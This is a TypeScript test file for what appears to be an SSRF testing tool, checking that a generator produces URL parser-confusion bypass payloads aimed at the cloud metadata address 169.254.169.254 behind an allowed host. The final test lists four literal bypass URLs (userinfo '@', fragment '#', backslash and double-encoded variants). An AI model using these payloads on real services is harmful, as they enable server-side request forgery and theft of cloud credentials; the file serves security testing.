import { test } from "node:test";
import assert from "node:assert";
import { generateParserConfusionPayloads } from "../core/engines/ssrf/bypasses/parser-confusion.ts";

test("Parser Confusion Bypass Payload Generation", async (t) => {
  const targetUrl = "http://169.254.169.254/";
  const allowedHost = "allowed.com";

  const payloads = generateParserConfusionPayloads(targetUrl, allowedHost);

  const getPayload = (tech: string) => {
    const found = payloads.find(p => p.technique === tech);
    if (!found) {
      throw new Error(`Technique not found: ${tech}`);
    }
    return found.payload;
  };

  await t.test("authority confusion", () => {
    const p = getPayload("authority confusion");
    assert.ok(p.includes("@"), `Payload must include '@': ${p}`);
  });

  await t.test("fragment confusion", () => {
    const p = getPayload("fragment confusion");
    assert.ok(p.includes("#"), `Payload must include '#': ${p}`);
  });

  await t.test("backslash confusion", () => {
    const p = getPayload("backslash confusion");
    assert.ok(p.includes("\\"), `Payload must include '\\': ${p}`);
  });

  await t.test("CRLF injection", () => {
    const p = getPayload("CRLF injection");
    assert.ok(p.includes("%0d%0a") || p.includes("%0D%0A"), `Payload must include CRLF: ${p}`);
  });

  await t.test("Unicode normalization", () => {
    const p = getPayload("Unicode normalization");
    assert.ok(/[^\x00-\x7F]/.test(p), `Payload must include non-ASCII characters: ${p}`);
  });

  await t.test("allowlist bypass", () => {
    const p = getPayload("allowlist bypass");
    assert.ok(p.includes("allowed.com"), `Payload must include allowedHost: ${p}`);
  });

  await t.test("open redirect chaining", () => {
    const p = getPayload("open redirect chaining");
    assert.ok(p.includes("allowed.com") && p.includes("169.254.169.254"), `Payload must contain allowedHost and targetUrl: ${p}`);
  });

  await t.test("scheme confusion", () => {
    const p = getPayload("scheme confusion");
    assert.ok(p.startsWith("//"), `Payload must start with '//': ${p}`);
  });

  await t.test("Orange Tsai patterns", () => {
    const expected = [
      "http://allowed.com@169.254.169.254/",
      "http://169.254.169.254#@allowed.com/",
      "http://allowed.com\\@169.254.169.254/",
      "http://169.254.169.254%2523@allowed.com/"
    ];
    const actual = payloads.map(p => p.payload);
    for (const exp of expected) {
      assert.ok(actual.includes(exp), `Missing expected Orange Tsai pattern: ${exp}`);
    }
  });
});
